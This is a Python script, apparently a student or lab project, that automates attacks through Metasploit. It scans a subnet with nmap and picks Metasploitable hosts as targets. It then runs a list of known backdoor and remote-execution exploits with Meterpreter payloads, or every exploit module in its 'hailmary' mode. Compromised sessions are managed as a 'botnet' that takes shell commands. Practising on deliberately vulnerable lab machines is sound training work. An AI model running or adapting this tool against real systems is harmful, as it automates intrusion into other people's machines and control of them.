from sys import argv
from typing import Protocol
from pymetasploit3.msfrpc import *
import nmap
import time
import random
import json

# Initialisation - connect to MSF RPC server
def init(uPassword="mypassword", uPort=55552):
    try:
        print('Connecting to client...')
        client = MsfRpcClient(uPassword, port=uPort)
        print('Connection successful')
        return client
    except:
        print(f'Error connecting to client: ensure that RPC client is running on port {uPort} and password is correct\n')
        exit(1)

# Initial scan and classification of network range
def scan(client, range='10.0.2.0/24'): 
     # TODO: remove arguments
    try:
        # Scan local network range using nmap
        print('Beginning scan of network...')
        nm = nmap.PortScanner()
        nm.scan(hosts=range, arguments='-PA22,80,433')
        data = nm.get_nmap_last_output()
        
        # Import scan into Metasploit database
        workspace = Workspace(client, 'default')
        workspace.importdata(data)
        hosts = workspace.hosts.records('hosts')
        services = workspace.services.records('services')
        
        # Identify Metasploitable instances
        targets = []
        for service in services:
            if "Metasploitable" in service["info"]:
                targets += [service["host"]]
        print(f'Scan complete: {len(hosts)} hosts found on network, {len(targets)} are targets\n')
        return targets
    except:
        print('Error scanning network, program terminating')
        exit(1)

# Loop through targets, attempting to exploit each with given list of exploits
def attemptExploit(client, target, exploits, timeout, debug):
    try:
        count = 0
        pwned = len(client.sessions.list)
        startTime = time.time()
        # Loop through all exploits using Meterpreter payloads
        for e in exploits:
            exploit = client.modules.use('exploit', e)
            try:
                for p in exploit.targetpayloads():
                    if 'meterpreter' in p:
                        # Set host option to be target hostname
                        try:
                            exploit['RHOST'] = target
                        except KeyError:
                            try:
                                exploit['RHOSTS'] = target
                            except KeyError:
                                continue
                        # Begin running an exploit
                        count+=1
                        if debug:
                            print(f'Attempting attack {count} against {target} - exploit {e} with payload {p}')
                        job = exploit.execute(payload=p)
                        jobID = job['job_id']
                        startTime = time.time()
                        # Wait for job to succeed, fail, or timeout
                        while(str(jobID) in list(client.jobs.list.keys())):
                            if time.time() - startTime >= timeout:
                                client.jobs.stop(jobID)
                                break
                        # If attack has succeeded on target stop
                        if len(client.sessions.list) > pwned:
                            print(f'Attack succeeded on {target} after {count} attempts\n')
                            pwned = len(client.sessions.list)
                            raise StopIteration
            except ValueError:
                pass

    except StopIteration:
        pass

# Attempt to exploit all targets
def exploitAll(client, targets, topExploits, timeout, debug):
    for targ in targets:
        #random.shuffle(topExploits)
        attemptExploit(client, targ, topExploits, timeout, debug)
    checkSessions(client)

# Print debug information about open sessions
def checkSessionDebug(client: MsfRpcClient):
    print(f'Sessions:\n{json.dumps(client.sessions.list, indent=4)}\n\n')

# Print information about open sessions
def checkSessions(client: MsfRpcClient):
    sessionList = list(client.sessions.list.keys())
    if len(sessionList) < 1:
        print('----------------------------------------')
        print('There are no open sessions')
        print('----------------------------------------\n')
    else:
        print('----------------------------------------')
        print('Current sessions:')
        print('----------------------------------------')
        for c in sessionList:
            session = client.sessions.list[c]
            print(f"Session {c}: {session['desc']} on {session['session_host']}:{session['session_port']} with {session['platform']} platform")
        print('----------------------------------------\n')

# Run a command against the botnet (all open sessions)
def runCommand(client: MsfRpcClient, command="help"):
    sessionList = list(client.sessions.list.keys())
    if len(sessionList) < 1:
        print('----------------------------------------')
        print('There are no open sessions')
        print('----------------------------------------\n')
    else:
        print('----------------------------------------')
        print(f"Running command '{command}' against {len(sessionList)} bots")
        print('----------------------------------------\n')
        for key in sessionList:
            try:
                shell = client.sessions.session(key)
                print('----------------------------------------')
                print(f'Session {key}:')
                print(shell.run_with_output(command))
            except:
                print('----------------------------------------')
                print(f"Encountered error with session {key}, skipping...")
        print('----------------------------------------')
        print(f"Command execution finished")
        print('----------------------------------------\n')

def checkTargets(targets):
    count = 0
    print('----------------------------------------')
    print('Current targets:')
    print('----------------------------------------')
    for t in targets:
        count+=1
        print(f'{count}: {t}')
    print('----------------------------------------\n')

def helpCommand():
    print('++++++++++++++++++++++++++++++++++++++++')
    print('Welcome to the automatic pentesting tool!')
    print('++++++++++++++++++++++++++++++++++++++++')
    print('You are currently connected to ')
    print('++++++++++++++++++++++++++++++++++++++++\n')

def main():
    # Variables for exploitation loop
    timeout = 30
    verbose=False
    topExploits = ['unix/ftp/vsftpd_234_backdoor','multi/samba/usermap_script','multi/misc/java_rmi_server','linux/postgres/postgres_payload','unix/irc/unreal_ircd_3281_backdoor','unix/misc/distcc_exec']
    client = ""

    # Connect to RPC and scan network for Metasploitable
    if len(argv) > 3:
        print('Too many arguments: please provide password and port, or nothing to use defaults')
        print('Format: main.py mypassword 55552')
        exit(1)
    elif len(argv) == 3:
        try:
            uPort = int(argv[2])
            uPass = argv[1]
            print(f'Using password {uPass} and port {uPort}')
            client = init(uPass, uPort)
        except ValueError:
            print('Invalid argument: port must be an integer')
            exit(1)
        except:
            exit(1)                
    elif len(argv) == 2:
        print('Too few arguments: please provide password and port, or nothing to use defaults')
        print('Format: main.py mypassword 55552')
        exit(1)
    else:
        client = init()
        
    targets = scan(client)

    checkSessions(client)

    #exploitAll(client, targets, topExploits, timeout)

    print('What would you like to do?\n')
    while(True):
        command = input()
        if command == "exit" or command == "quit":
            print('Exiting program, goodbye!')
            exit(0)
        
        elif command == "help":
            helpCommand()
        
        elif command == "sessions":
            checkSessions(client)

        elif command == "targets":
            checkTargets(targets)
        
        elif "verbose" in command:
            try:
                params = command.split("=")[1].upper()
                if params == "TRUE":
                    verbose = True
                    print('Verbose mode has been enabled\n')
                elif params == "FALSE":
                    verbose = False
                    print('Verbose mode has been disabled\n')
                else:
                    print('Command error: Invalid value given, setting verbose mode to false\n')
                    verbose = False
            except:
                print("Command error: format is 'verbose=True' or 'verbose=False'\n")
        elif "timeout" in command:
            try:
                params = int(command.split("=")[1])
                timeout = params
                print(f"Now using timeout value of {timeout}\n")
            except:
                print("Command error: format is 'timeout=value', value must be an integer\n")
        
        elif command == "attack":
            print('----------------------------------------')
            print(f'Running top exploits aganst targets (timeout: {timeout})')
            print('----------------------------------------')
            exploitAll(client, targets, topExploits, timeout, verbose)
        
        elif command == "hailmary":
            print('----------------------------------------')
            print(f'Running every single exploit aganst targets (timeout: {timeout})')
            print('----------------------------------------')
            exploitAll(client, targets, client.modules.exploits, timeout, verbose)

        elif "runcommand" in command:
            try:
                if len(list(client.sessions.list.keys())) < 1:
                    print("There are no open sessions, try running 'attack'\n")
                else:
                    cmd = command.split("=")[1]
                    if len(cmd) < 1:
                        runCommand(client)
                    else:
                        runCommand(client, cmd)
            except:
                print("Command error: format is 'runcommand=command', command may have spaces\n")

        else:
            print('Command not recognised: try help to see list of commands\n')
        #print(f'Output: {command}')

if __name__ == "__main__":
    main()